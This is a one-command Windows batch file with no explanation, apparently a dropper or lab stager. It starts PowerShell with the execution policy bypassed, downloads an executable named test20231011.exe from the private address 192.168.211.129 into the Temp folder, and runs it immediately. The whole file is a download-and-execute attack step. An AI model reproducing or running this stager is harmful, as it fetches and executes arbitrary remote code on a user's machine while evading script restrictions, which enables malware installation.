@echo off
C:\Windows\System32\cmd.exe /c powershell.exe -executionpolicy bypass -command (New-object System.Net.WebClient).DownloadFile('http://192.168.211.129/test20231011.exe', $env:Temp + '\test20231011.exe'); Invoke-Item "$env:Temp\test20231011.exe"
